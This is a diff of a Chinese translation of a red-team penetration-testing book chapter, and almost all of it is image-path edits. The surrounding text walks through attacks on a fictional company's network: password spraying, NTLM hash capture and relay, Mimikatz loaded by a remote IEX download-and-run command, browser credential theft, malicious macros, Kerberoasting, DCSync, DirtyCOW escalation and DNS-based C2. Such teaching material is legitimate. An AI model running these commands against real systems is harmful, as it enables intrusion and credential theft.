@@ -4,7 +4,7 @@
 > 
 > 校对者：[@鶇](http://wp.blkstone.me)、[@leitbogioro](https://github.com/leitbogioro/)、@哈姆太郎、@匿名jack
 
-![](img/chapter_4/4-1.png)
+![](img/4-1.png)
 
 在进行风险评估项目的第二天，你使用 nmap 扫描了目标的全部网段，还启动了漏洞扫描器，但运气不太好，你没有探测出任何 Web 应用程序的初始入口点。这让你感到有些失败，需要反思一下，重新回顾一下之前收集到的所有信息。因为你知道，一旦可以进入目标网络，就可以使用无数的技巧来获得更多的凭证、在域中漫游、利用 AD（活动目录）的特性，最后找到我们要找的东西。当然，这不是一件容易的事。因为你要绕过众多防火墙，还要欺骗管理员，最后还要擦除自己的痕迹。
 
@@ -50,7 +50,7 @@ spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod
 
 编好了密码之后，我们就可以24小时不间断缓慢地运行我们的账号破解程序，慢是为了避免触发任何帐号锁定。请记住，我们仅仅匹配成功一个账号就可以进入大门了！
 
-![](img/chapter_4/4-2.png)<br> *此图是使用 Curl 对 OWA 进行身份认证的快速脚本*
+![](img/4-2.png)<br> *此图是使用 Curl 对 OWA 进行身份认证的快速脚本*
 
 配置 Spray 非常简单，而且其配置文件可以很容易地给其他类似程序参考使用。你需要做的是捕获登录密码时的 POST 请求（可以在 Burp Suite 中完成），复制所有请求数据，并将其保存到文件中。对于任何将要被破解的字段，你需要提供字符串“sprayuser”和“spraypassword”。
 
@@ -96,11 +96,11 @@ destination=https%3A%2F%2Fcyberspacekittens.com%2Fowa%2F&flags=4&forcedownlevel=
 ruler --domain cyberspacekittens.com brute --users ./users.txt --passwords ./passwords.txt
 ```
 
- ![](img/chapter_4/4-3.png)
+ ![](img/4-3.png)
 
 一旦我们找到了一个密码，我们就可以使用 Ruler 来获取 Office 365的全局地址列表（GAL）中的所有用户，以查找更多的电子邮件地址及其所属的电子邮件组。
 
- ![](img/chapter_4/4-4.png)
+ ![](img/4-4.png)
 
 我们继续将获取的这些电子邮件地址通过上面提及的那些密码破解工具来进行破解的尝试，从而获得更多的身份凭证——这就和滚雪球一样。不过，Ruler 的主要用途是，一旦你有了身份凭证，你就可以利用 Office/Outlook 的一些功能来在受害者的电子邮件帐户上创建规则和表单。这里有一篇来自 SensePost 安全团队的文章 [outlook-forms-shells](https://sensepost.com/blog/2017/outlook-forms-shells/)，介绍了他们是怎样利用这些功能来执行包含 Empire payload 的宏文件的。
 
@@ -193,7 +193,7 @@ ruler --domain cyberspacekittens.com brute --users ./users.txt --passwords ./pas
 
 现在，因为我们处于 Windows 的企业环境中，我们可以假设它很可能正在运行 Active Directory（活动目录）。因此，如果我们能够响应来自受害者主机的 DNS 查找请求，我们就可以使他们的系统连接到我们的 SMB 共享服务。由于它们正在连接到 \cyberspacekittenssecretdrive 驱动器，因此我们将强制受害者使用他的 NTLMv2 凭证（或缓存的凭证）进行身份验证。我们捕获的这些凭证不是直接的 NTLM 哈希，而是 NTLM 请求/响应哈希（NTLMv2-SSP）。这些哈希表的唯一缺点是，破解它们的速度要比普通的 NTLM 哈希表要慢得多，但是相比于我们要进行的大型凭证爆破动作来说，这不是一个大麻烦。
 
-![](img/chapter_4/4-5.png)
+![](img/4-5.png)
 
 我们可以获取 NTLMv2哈希，将其传递给本地的 hashcat 程序破解此密码。在 hashcat 中，我们需要指定散列格式 “-m”（ https://hashcat.net/wiki/doku.php?id=example_hashes ）为 Net-NTLMv2 。
 
@@ -203,11 +203,11 @@ ruler --domain cyberspacekittens.com brute --users ./users.txt --passwords ./pas
 
 - python ./Responder.py -I eth0 -wfFbv
 
-![](img/chapter_4/4-6.png)
+![](img/4-6.png)
 
 从上面的图像中可以看到，用户将被提示输入用户名和密码，大多数人只是按部就班的按提示输入。一旦他们提交了他们的用户名和密码，我们将能够捕获他们的密码明文!
 
-![](img/chapter_4/4-7.png)
+![](img/4-7.png)
 
 ### 更好的 Responder（MultiRelay.py）
 
@@ -227,7 +227,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 
 一旦可以实现通过中继连接到受害者主机，我们就需要考虑要在受害者的主机上执行什么操作。默认情况下，MultiRelay 可以生成一个比较基础的 shell，但我们也可以自动执行 Meterpreter PowerShell payloads、Empire PowerShell payloads、dnscat2 PowerShell payloads、PowerShell 脚本（用于下载和执行 C2代理)、Mimikatz，或者只是运行 calc.exe 作为测试娱乐。
 
-![](img/chapter_4/4-8.png)
+![](img/4-8.png)
 
 
 参考文献
@@ -251,7 +251,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 
 - nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=“cyberspacekittens.local”,userdb=/opt/userlist.txt <Domain Controller IP>
 
-![](img/chapter_4/4-9.png)
+![](img/4-9.png)
 
 我们将需要提供一个要测试的用户名列表，但是由于我们只是查询 DC（域控制器）而没有对其进行身份验证，因此通常此行动不会被检测。现在，我们可以采用这些用户帐户，并再次开始密码猜解!
 
@@ -270,9 +270,9 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 - 运行 CME 来生成 Empire shells
   - cme smb 10.100.100.0/24 -d ‘cyberspacekittens.local’ -u ‘<username>’ -p ‘<password>’ -M empire_exec -o LISTENER=http
 
-![](img/chapter_4/4-10.png)
+![](img/4-10.png)
 
-![](img/chapter_4/4-11.png)
+![](img/4-11.png)
 
 ## 在攻陷你的第一台机器之后
 
@@ -319,7 +319,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 - 查看每个标记的所有查询/命令。我喜欢用的一个是枚举类
   - ./rtfm.py -t enumeration | more
 
-![](img/chapter_4/4-12.png)
+![](img/4-12.png)
 
 现在，RTFM 非常广泛，有许多不同的有用命令。这是一个不断快速更新的优秀的资源。
 
@@ -348,7 +348,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 - Empire PowerUp 模块:
   - usermodule privesc/powerup/allchecks
 
-![](img/chapter_4/4-13.png)
+![](img/4-13.png)
 
 最突出的是:
 
@@ -379,7 +379,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 - 将 windows.txt 复制到你的 Kali 虚拟机的  /opt/Windows-Exploit-Suggester 下
 - python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls
 
-![](img/chapter_4/4-14.png)
+![](img/4-14.png)
 
 这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。
 
@@ -431,7 +431,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 
 假设你攻击了 Windows 10系统的主机并且提升权限了，默认情况下，你将调整 Mimikatz 的配置，并根据下面的查询查看到密码字段为空。
 
-![](img/chapter_4/4-15.png)
+![](img/4-15.png)
 
 那么你能做什么呢？最简单的选项是设置注册表项以让系统将密码凭证保存到 LSASS 进程。在 HKLM 中，有一个 UseLogonCredential 设置，如果设置为0，系统将在内存中存储凭据（ http://bit.ly/2vhFBiZ ）：
 
@@ -445,7 +445,7 @@ Laurent Gaffie 在 Responder 中加入了一个处理身份验证重放攻击的
 
 一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz 来获得明文密码。
 
-![](img/chapter_4/4-16.png)
+![](img/4-16.png)
 
 如果我们无法提升到本地管理帐户怎么办？我们还有哪些其他方法可以获得用户的凭证？在过去，一个常见的渗透攻击是在客户机的用户空间内存中查看凭据是否以明文形式存储。现在一切都是基于浏览器的，我们能在浏览器中做同样的事情吗？
 
@@ -455,7 +455,7 @@ Mimikitten 支持 Gmail，Office365，Outlook Web，Jira，Github，Bugzilla，Z
 
 这个工具最好的地方在于它不需要本地管理员权限，因为他只需要访问那些用户本身创建的进程。一旦我们攻击进了主机，我们将把 Mimimikittenz 导入内存，并运行 Invoke-mimikittenz 脚本。
 
-![](img/chapter_4/4-17.png)
+![](img/4-17.png)
 
 正如上面所看到的，用户通过 Firefox 登录到 Github 中，我们可以从浏览器内存中提取他们的用户名和密码。现在，我希望这本书的读者都能把这个工具用的越来越高级，为不同的应用程序创建更多的搜索查询。
 
@@ -463,7 +463,7 @@ Mimikitten 支持 Gmail，Office365，Outlook Web，Jira，Github，Bugzilla，Z
 
 Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。记不记得当你使用 Microsoft IE/EDGE 对网站进行身份验证后，通常会弹出一个弹出窗口，询问“是否要保存密码？”凭证存储就是存储这些信息的地方，在凭据管理器中，有两种类型的凭据：Web 和 Windows。你还记得哪个用户有权访问这些数据吗？它不是 `system`，而是登录后可以检索此信息的用户。这对我们来说是很好的，就像任何钓鱼网站或代码执行一样，我们通常都可以用别的方法获得那个用户的权限。最好的一点是，我们甚至不需要成为本地管理员来提取这些数据。
 
-![](img/chapter_4/4-18.png)
+![](img/4-18.png)
 
 如何提取这些信息呢？我们可以使用两种不同的 PowerShell 脚本导入以收集此数据：
 
@@ -472,13 +472,13 @@ Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站
 - 收集 Windows 凭证（只收集通用的而不是目标域特有的）：
   - https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1
 
-![](img/chapter_4/4-19.png)
+![](img/4-19.png)
 
 从上图中可以看到，我们提取了他们的 Facebook 存储的凭证和任何他们拥有通用的凭证。记住，对于 Web 凭据，Get-WebCredentials 只能从 Internet Explorer/Edge 获取密码。如果我们需要从 Chrome 获取，我们可以使用 Empire payload 的 powershell/collection/ChromeDump。在获取之前，要运行 ChromeDump 的话，首先需要终止 Chrome 进程，然后运行 ChromeDump，最后，我喜欢拉取下载所有的浏览器历史和 cookies。 我们不仅可以了解他们的内部服务器的大量信息，而且，如果他们的会话仍然存在，我们也可以使用他们的 cookies 和身份验证，而不必知道他们的密码!
 
 使用如下 PowerShell 脚本：https://github.com/sekirkity/browsergather ，我们可以提取所有浏览器 cookies，并通过我们的浏览器利用这些 cookies，但是所有这些 cookies 都没有提升权限的功能。
 
-![](img/chapter_4/4-20.png)
+![](img/4-20.png)
 
 接下来，我们甚至可以开始在受害者系统上可能安装的所有第三方软件中寻找服务器和凭证。一个叫做 [SessionGopher](https://github.com/fireeye/SessionGopher) 的工具可以从 winscp、putty、superputty、filezilla 和 microsoft 远程桌面获取主机名和保存密码。还有一个其他功能是能够从网络上的其他系统远程获取它的本地凭据，启动 sessiongopher 的最简单方法是导入 PowerShell 脚本并执行使用：
 
@@ -506,17 +506,17 @@ Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站
    ```
 5. 生成 Payload
 
-![](img/chapter_4/4-21.png)
+![](img/4-21.png)
 
 如果你查看生成的 Office 宏，你将看到它只是由 Python 执行的 Base64代码。幸运的是，Python 是 Mac 上的默认应用程序，当执行这个宏时，我们应该得到 `agent beacon`。
 
 要在 Mac 中创建恶意 Exce l文件，我们可以打开一个新的 Excel 工作表，转到“工具”，查看宏，然后在此工作簿中创建宏，一旦 Microsoft Visual Basic 打开，就删除所有当前代码并将其替换为所有新的宏代码。最后，将其保存为 XLSM 文件。
 
-![](img/chapter_4/4-22.png)
+![](img/4-22.png)
 
 现在，把你的恶意文件发送给你的目标攻击者，看着 Empire 大展神威。在受害者那边，一旦他们打开 Excel 文件，就会出现这样的情况：
 
-![](img/chapter_4/4-23.png)
+![](img/4-23.png)
 
 确保创建了一个合理的情形，让他们单击“启用宏”。
 
@@ -564,7 +564,7 @@ usemodule collection/osx/webcam
 
 我们可以从 setspn 中看到什么类型的信息？下面，运行 setspn 命令，我们会看到一些在域控制器上运行的服务的信息，还有关于工作站的信息，我们还找到了一个名为 csk-github 的服务器。在这个服务器中，我们可以看到在主机上运行着一个 HTTP 服务。如果这些相同的协议运行在不同的端口上的话，这些信息也会被列出。
 
-![](img/chapter_4/4-24.png)
+![](img/4-24.png)
 
 setspn 不仅提供有关服务用户和所有主机名的有用信息，它甚至也会告诉我们哪些服务正在系统上什么端口上运行。如果我们可以直接从 AD 中获取服务甚至端口的大部分信息，那为什么我们还需要扫描网络？我们可能马上攻击的东西是什么？Jenkins？ Tomcat？ ColdFusion？
 
@@ -578,13 +578,13 @@ setspn 不仅提供有关服务用户和所有主机名的有用信息，它甚�
 
 让我们通过一个例子来说明我们可以从这个低权限用户那里获得多少数据。在一开始，我们已经在运行 Empire（你可以在 Metasploit、Cobalt Strike 或类似软件都可以），并在受害者系统上执行了 payload。如果你以前从未建立过 Empire，请查看有关建立 Empire 和 Empire payload 的设置章节。一旦我们的代理（agent）与我们的命令和控制服务器通信，我们就可以键入 `info` 以查找有关受害者的信息。在本例中，我们已经攻陷了运行完整补丁的 Windows 10系统的主机，该系统的用户名为 neil.pawstrong，位于 CyberspaceKitten 的域中。
 
-![](img/chapter_4/4-25.png)
+![](img/4-25.png)
 
 接下来，我们希望在不引起太多怀疑和注意的情况下从域中查询信息，我们可以使用 Empire 内部的 PowerView 工具来获取信息。PowerView 查询域控制器（DC）以获取有关用户、用户组、计算机等的信息。我们此次使用 PowerView 将只用来查询域控制器，并且使它看起来像正常通信。
 
 Empire 下有哪些模块可用于信息收集呢？
 
-![](img/chapter_4/4-26.png)
+![](img/4-26.png)
 
 我们可以从 PowerView 脚本的 get_user 的函数名开始。获取指定域中指定查询用户的信息。通过使用默认设置，我们可以获取有关 AD 中用户的所有信息以及相关信息的转储。
 
@@ -592,7 +592,7 @@ Empire 下有哪些模块可用于信息收集呢？
 Module: situational_awareness/network/powerview/get_user
 ```
 
-![](img/chapter_4/4-27.png)
+![](img/4-27.png)
 
 在上面的转储文件中，我们可以看到关于其中一个用户 `purri gagarin` 的信息。我们得到了什么类型的信息？我们可以看到他们的 sAMAccountName 或用户名，当他们的密码被更改时，看到他们的对象类别是什么，他们是什么权限组的成员，最后登录的时间是什么，等等。使用这个基本的用户转储，我们可以从目录服务中获得大量的信息。我们还能得到什么样的信息呢？
 
@@ -608,7 +608,7 @@ get-group-member 返回给特定组的成员，并选择“recurse”以查找�
 -  set FullData True
 -  execute
 
-![](img/chapter_4/4-28.png)
+![](img/4-28.png)
 
 现在，我们有一个用户、组、服务器和服务的收集列表。这将帮助我们了解哪些用户拥有哪些特权。但是，我们仍然需要有关工作站和系统的详细信息。这可能包括版本、创建日期、用途、主机名等。我们可以用一个叫做 get_computer 的模块来获得这些信息。
 
@@ -618,7 +618,7 @@ Module: situational_awareness/network/powerview/get_computer
 
 描述：get_computer 模块可以查询域中当前的计算机对象。
 
-![](img/chapter_4/4-29.png)
+![](img/4-29.png)
 
 get_computer 查询域控制器可以获得什么信息呢？好吧，我们看到我们可以获得关于机器的信息，比如当它被创建时的 DNS 主机名，自定义名称等等。作为攻击者，最有用的侦察细节之一是获取操作系统类型和操作系统版本。在这种情况下，我们可以看到这个系统是 Windows 10 Build 16299版本。我们可以通过获取这些信息，了解操作系统的最新版本以及它们是否在 Microsoft 的发布信息页上存在修补的补丁：https://technet.microsoft.com/en-us/windows/release-info.aspx 。
 
@@ -691,11 +691,11 @@ Bloodhound/Sharphound 的工作原理是在受害者系统上运行一个 Ingest
 
 如果你没有一个域来测试这个，我已经在这里上传了四个 Bloodhound 文件：https://github.com/cyberspacekittens/bloodhound ，这样你就可以重复这些练习了。一旦进入 Bloodhound 并导入了所有数据，我们就可以去查询“查找到域管理员的最短路径”。我们还可以选择特定的用户，看看是否可以将路径映射到特定的用户或组。在我们的示例中，我们攻陷的第一个用户机器是 NEIL.PAWSTRONG@CYBERSPACEKITTENS.LOCAL。在搜索栏中，我们输入该用户的用户名，单击 `Pathfinding` 按钮，然后键入“Domain Admin”（或任何其他用户），查看是否可以在这些对象之间显示对应的路由路径。
 
-![](img/chapter_4/4-30.png)
+![](img/4-30.png)
 
 你可以从 Neil 的机器上看到，我们可以一路顺利的到 CSK 实验组。在“实验”组中，有一个名为 Purri 的用户，他是 HelpDesk 组的成员。
 
-![](img/chapter_4/4-31.png)
+![](img/4-31.png)
 
 如果我们能攻陷 HelpDesk 组，我们可以转到 Chris 的主机中，而且 Elon Muskkat 目前已登录此机器。如果我们能转移到他的进程或窃取他的明文密码，我们就可以把权限提升到域管理员！
 
@@ -715,7 +715,7 @@ Bloodhound/Sharphound 的工作原理是在受害者系统上运行一个 Ingest
 
 保存之后，我们应该创建更多的查询。现在我们可以单击查找结果“查找从所属节点到域管理员的最短路径”。
 
-![](img/chapter_4/4-32.png)
+![](img/4-32.png)
 
 如果你想更仔细地研究这个问题，请查看 @porterhau5的 fork 版 Bloodhound。它用标记使被攻陷机器更直观，并允许更多的自定义功能：https://github.com/porterhau5/bloodhound-owned 。
 
@@ -746,7 +746,7 @@ Bloodhound/Sharphound 的工作原理是在受害者系统上运行一个 Ingest
 
 psinject 描述“能够使用 ReflectivePick 将代理注入另一个进程，从而将通用.NET运行库时加载到进程中并执行特定的 PowerShell 命令，而无需启动新的 PowerShell.exe 进程！”[ http://bit.ly/2HDxj6x ]，我们使用它来生成一个全新的、以 buzz.clauldrin 的用户进程运行的 agent，这样我们现在就可以获得他的访问权限。
 
-![](img/chapter_4/4-33.png)
+![](img/4-33.png)
 
 ### 离开初始主机
 
@@ -758,11 +758,11 @@ psinject 描述“能够使用 ReflectivePick 将代理注入另一个进程，�
 
 Empire 的 find_localadmin_access 将查询 Active Directory 中的所有主机名并尝试连接到它们。这绝对是一个会造成很大动静的工具，因为它需要连接到每个主机并且验证它是否是本地管理员。
 
-![](img/chapter_4/4-34.png)
+![](img/4-34.png)
 
 我们可以看到，Empire 的 find_localadmin_access 模块标明了用户访问我们的陷阱的是一个 buzz.cyberspacekittens.local 机器。这应该和我们的 Bloodhound 回显的是一样的。为了再次检查我们是否有访问权限，我通常会执行一些非交互的远程命令，比如 dir \[remote system]\C$ 并查看我们是否有对 C 盘的读/写权限。
 
-![](img/chapter_4/4-35.png)
+![](img/4-35.png)
 
 在域内横向移动方面，有好几种做法。让我们先来看看 Empire 中最常见的（直接从 Empire 中提取的）：
 
@@ -798,7 +798,7 @@ Empire 的 find_localadmin_access 将查询 Active Directory 中的所有主机�
 - sysinfo
   
 
-![](img/chapter_4/4-36.png)
+![](img/4-36.png)
 
 ### 利用 DCOM 的横向移动
 
@@ -806,7 +806,7 @@ Empire 的 find_localadmin_access 将查询 Active Directory 中的所有主机�
 
 你可以使用 Powershell 命令列出计算机的所有 DCOM 应用程序：GetCimInstance Win32_DCOMApplication
 
-![](img/chapter_4/4-37.png)
+![](img/4-37.png)
 
 安全研究员 @enigam0x3 的研究发现（ https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ ），有多个对象（例如 ShellBrowserWindow 和 ShellWindows ）允许在受害者主机上远程执行代码。当列出所有 DCOM 应用程序（如上图所示）时，你将看到一个 CLSI 为 C08AFD90-F2A1-11D1-845500A0C91F3880 的 ShellBrowserWindow 对象。识别出该对象后，只要我们的帐户有权访问，我们就可以利用此功能在远程工作站上执行二进制文件。
 
@@ -818,11 +818,11 @@ Empire 的 find_localadmin_access 将查询 Active Directory 中的所有主机�
 $([activator]::CreateInstance([type]::GetTypeFromCLSID(“C08AFD90-F2A1-11D1-8455-
 00A0C91F3880”，“buzz.cyberspacekittens.local”))).Navigate(“\neil.cyberspacekittens.local\Public\adobeupdate.exe”)
 
-![](img/chapter_4/4-38.png)
+![](img/4-38.png)
 
 正如你在下一张图片中看到的，Buzz 的计算机上出现了一个关于运行 adobeupdate.exe 文件的弹出窗口。虽然大多数用户都会点击并运行这个，但它可能会让我们被目标察觉。
 
-![](img/chapter_4/4-39.png)
+![](img/4-39.png)
 
 因此，避免这个问题的更好方法是在使用 DCOM 执行该文件之前将该文件移到上面（类似于装载受害者的驱动器）。@Enigam0x3对此做得更进一步，并利用 Excel 宏来使用 DCOM。首先，我们需要在自己的系统上创建恶意 Excel 文档，然后使用 [PowerShell 脚本](https://bit.ly/2pzJ9GX)在受害者主机上执行此.xls 文件。
 
@@ -867,7 +867,7 @@ PTH 最基本的用途是攻击本地管理员。由于默认情况下本地管�
 
 我们可以使用 Empire（credentials/mimikatz/pth）或者启动可信任的 psexec，提交我们的哈希，并执行我们的自定义 payload，如下图所示：
 
-![](img/chapter_4/4-40.png)
+![](img/4-40.png)
 
 如前所述，这是一种现在少见的古老的横向移动方式。如果你仍在考虑利用本地管理员帐户，但所处的环境有 LAPS（本地管理员密码解决方案），你可以使用几个不同的将它们从 Active Directory 中转储出的工具。这假设你已经拥有一个域管理员或 Helpdesk 类型帐户的权限：
 
@@ -898,12 +898,12 @@ PTH 最基本的用途是攻击本地管理员。由于默认情况下本地管�
 - 当然，你也可以使用 powersploit 执行此操作：
   - https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
 
-![](img/chapter_4/4-41.png)
+![](img/4-41.png)
 
 如果成功的话，我们已经将一个或多个不同的 Kerberos 票证导入到受害者计算机的内存中。我们现在需要一种方法来提取票据。我们可以使用好工具 Mimikatz Kerberos 导出：
 - powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2qx4kuH’); Invoke-Mimikatz -Command ’”““kerberos::list /export”””’
 
-![](img/chapter_4/4-42.png)
+![](img/4-42.png)
 
 一旦我们导出这些票证，它们将仍会驻留在受害者的机器上。在我们开始破解它们之前，我们必须从它们的系统中下载它们。请记住，票据是用服务帐户的 NTLM 哈希加密的。所以，如果我们能猜到 NTLM 哈希，我们就可以读取票据，现在也知道服务帐户的密码。破解账户最简单的方法是使用一个名为 tgsrepcrack 的工具（JTR 和 Hashcat 也支持破解 Kerberoast，稍后我们将讨论）。使用 Kerberoast 破解票证：
 
@@ -911,7 +911,7 @@ PTH 最基本的用途是攻击本地管理员。由于默认情况下本地管�
   - cd /opt/kerberoast
   - python tgsrepcrack.py [password wordlist ][kirbi ticketss - *.kirbi]
 
-![](img/chapter_4/4-43.png)
+![](img/4-43.png)
 
 在这个例子中，服务帐户 csk-github 的密码是“p@ssw0rd!”
 
@@ -919,7 +919,7 @@ PTH 最基本的用途是攻击本地管理员。由于默认情况下本地管�
 
 你可以用 John the Ripper 甚至 Hashcat 来破解密码并输出结果。我以前在非常大的网络环境中运行 PowerShell 脚本时遇到过一些问题，因此，退一步的方法是使用 PowerShell 和 Mimikatz 将所有的票据都获取下来。
 
-![](img/chapter_4/4-44.png)
+![](img/4-44.png)
 
 ## 转储域控制器哈希
 
@@ -952,7 +952,7 @@ DCSync
 
 Empire 模块：powershell/credentials/mimikatz/dcsync_hashdump
 
-![](img/chapter_4/4-45.png)
+![](img/4-45.png)
 
 查看 DCSync hashdump，我们可以看到 Active Directory 中用户的所有 NTLM 哈希。此外，我们还有 krbtgt NTLM 哈希，这意味着我们现在（或在未来的活动中）可以执行 Golden Ticket attacks（黄金票据攻击）。
 
@@ -960,7 +960,7 @@ Empire 模块：powershell/credentials/mimikatz/dcsync_hashdump
 
 在当今世界，有了大量的新一代杀毒软件，在计算机之间横向运行 WMI/PowerShell Remoting/PSExec 并不总是最好的选择。我们还看到一些组织系统正在记录所有发生的 Windows 命令提示。为了解决这一切，我们有时需要回到基本的横向运动。使用 VPS 服务器的问题是，它只是一个没有 GUI 接口的 shell。因此，我们将配置路由和代理转发来自攻击者主机的流量，通过 VPS，然后再到被攻陷的主机，最后横向移动到下一个受害者。幸运的是，我们可以使用大部分本地工具完成任务。
 
-![](img/chapter_4/4-46.png)
+![](img/4-46.png)
 
 首先，我们需要设置一个 VPS 服务器，启用开放到公网的多个端口，用 PTH 配置 Metasploit，并用 Meterpreter 攻陷最初的受害者。我们也可以用 Cobalt Strike 或其他框架来实现这一点，但在本例中我们将使用 Meterpreter。
 
@@ -973,7 +973,7 @@ Empire 模块：powershell/credentials/mimikatz/dcsync_hashdump
     - portfwd add -l 3389 -p 3389 -r [Victim via RDP IP Address]
 4. 在我们的攻击者机器上，打开我们的 Microsoft 远程桌面客户端，将你的连接设置为你自己的本地主机 -127.0.0.1，然后输入受害者的凭据以通过 RDP 进行连接。
 
-![](img/chapter_4/4-47.png)
+![](img/4-47.png)
 
 ## 在 Linux 中横向移动
 在 Linux 中的操作多年来变化不大。通常，如果你使用的是 dnscat2 或 Meterpreter，它们都支持自己的转发。
@@ -992,7 +992,7 @@ Empire 模块：powershell/credentials/mimikatz/dcsync_hashdump
 
 - https://github.com/huntergregal/mimipenguin
 
-![](img/chapter_4/4-48.png)
+![](img/4-48.png)
 
 一旦我们在被入侵的主机上获得了凭证，并且可以通过 SSH 反弹 shell，我们就可以通过这个隧道传输流量，并在机器之间进行数据隐藏。在 SSH 中，有一些很好的特性可以让我们执行这个操作过程：
 - 设置动态 Sock Proxy 以使用 proxychains 通过主机隐藏我们的所有流量：
@@ -1010,7 +1010,7 @@ Linux 权限提升在很大程度上与 Windows 类似。我们寻找可以写�
 
 在我们进行任何类型的权限提升攻击之前，我首先要在 Linux 主机上进行一个良好的信息收集工作，并识别所有关于系统的信息。这包括用户、服务、定时任务、软件版本、弱信任对象、错误配置的文件权限，甚至是 Docker 信息。我们可以使用一个名为 LinEnum 的工具来为我们完成所有的累活（ https://github.com/rebootuser/linenum ）。
 
-![](img/chapter_4/4-49.png)
+![](img/4-49.png)
 
 这是一个非常长的报告，内容是你可能想要了解的关于底层系统的所有信息，这对于未来的活动来说是非常好的。
 
@@ -1018,7 +1018,7 @@ Linux 权限提升在很大程度上与 Windows 类似。我们寻找可以写�
 
 我们可以运行一个名为 [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) 的工具来分析主机系统并识别缺失的补丁和漏洞。一旦识别出漏洞，该工具还将向你提供可用 PoC 漏洞的链接。
 
-![](img/chapter_4/4-50.png)
+![](img/4-50.png)
 
 现在，我们要利用什么呢？这就是经验和实践真正发挥作用的地方。在我的实验中，我将配置大量不同的 Linux 版本，以验证这些漏洞攻击不会使底层系统崩溃。在这个场景中，我最喜欢的一个漏洞是 DirtyCOW。
 
@@ -1084,7 +1084,7 @@ DirtyCOW 的工作原理是“在Linux内核的内存子系统处理写访问时
 
 你注意到有三个设备正在运行，但只有一个设备启用了 Web 端口。看起来其他两个设备与安全网络之外是隔离的，这意味着我们必须首先入侵172.16.250.10设备才能转到其他两个服务器。访问第一个系统（172.16.250.10），你会看到 Apache Tomcat 正在监听端口8080，而一些 OpenCMS 在端口80上。运行 web fuzzer 时，你会注意到 OpenCMS  页面也在运行 Apache Struts2（或者是 struts2 showcase）。你的脑海立马想到了Equifax 数据泄露事件中黑客的攻击手法。你喜出望外，太好了，但你还是要检查一下。在 msfconsole 上运行一个快速搜索并测试漏洞 `struts2_content_type_ognl`。
 
-![](img/chapter_4/4-51.png)
+![](img/4-51.png)
 
 我们知道，CSK 会严格监控受保护的网络流量，其内部服务器可能不允许直接访问公司网络。为了解决这个问题，我们必须使用我们的 DNS C2 payload 和 dnscat2 来通过 UDP 而不是 TCP 进行通信。当然，在真实操作中，我们可能会使用权威的 DNS 服务器，但仅针对本地测试的话，我们将配置自己的 DNS 服务器。
 
@@ -1099,7 +1099,7 @@ DirtyCOW 的工作原理是“在Linux内核的内存子系统处理写访问时
   - ruby ./dnscat2.rb
 - 为 dnscat 记录你的密钥
 
-![](img/chapter_4/4-52.png)
+![](img/4-52.png)
 
 - 打开新终端并加载 Metasploit
   - msfconsole
@@ -1115,7 +1115,7 @@ DirtyCOW 的工作原理是“在Linux内核的内存子系统处理写访问时
   - run
 - 一旦 payload 执行，你将不会在 Metasploit 中得到任何确认，因为我们使用了 dnscat 的 payload。你需要检查你的 dnscat 服务器是否有任何使用 DNS 流量的连接。
 
-![](img/chapter_4/4-53.png)
+![](img/4-53.png)
 
 - 回到 dnscat2服务器上，检查新执行的 payload 并创建一个 shell 终端。
   - 与第一个 payload 进行交互
@@ -1129,14 +1129,14 @@ DirtyCOW 的工作原理是“在Linux内核的内存子系统处理写访问时
   - 键入 shell 命令
     - ls
 
-![](img/chapter_4/4-54.png)
+![](img/4-54.png)
 
 你已经入侵了 OpenCMS/Apache Struts 服务器！现在要做什么？你需要花一些时间检查服务器并寻找有趣的信息。你想起来服务器正在运行 OpenCMS Web 应用程序，并确定该应用程序是在 /opt/tomcat/webapps/kittens 下配置的。在查看 OpenCMS 属性的配置文件时，我们发现数据库、用户名、密码和 IP 地址为 172.16.250.10。
 
 检索数据库信息：
 - cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
 
-![](img/chapter_4/4-55.png)
+![](img/4-55.png)
 
 我们成功连接到数据库了，但看不到太多信息。这是因为我们目前是一个有限的 Tomcat 用户，这确实阻碍了我们的攻击。因此，我们需要找到一种提权的方法。在服务器上运行 post exploitation reconnaissance（uname -a && lsb_release -a），你可以识别出这是一个非常旧的 Ubuntu 版本。幸运的是，此服务器容易受到权限提升漏洞 DirtyCOW 的攻击。让我们创建一个 DirtyCOW 二进制文件并转到根目录！
 
@@ -1151,7 +1151,7 @@ Escalation 提升 dnscat 权限：
     - echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops && echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn
 - whoami
 
-![](img/chapter_4/4-56.png)
+![](img/4-56.png)
 
 注意：DirtyCOW 不是一个非常稳定的提权方法。如果你对漏洞利用过程有问题，请查看我的 Github 页面，在这里了解创建 setuid 二进制文件的更稳定的过程：
 
@@ -1164,7 +1164,7 @@ Escalation 提升 dnscat 权限：
 - head ~/.ssh/id_rsa
 - ssh -i ~/.ssh/id_rsa root@172.16.250.30
 
-![](img/chapter_4/4-57.png)
+![](img/4-57.png)
 
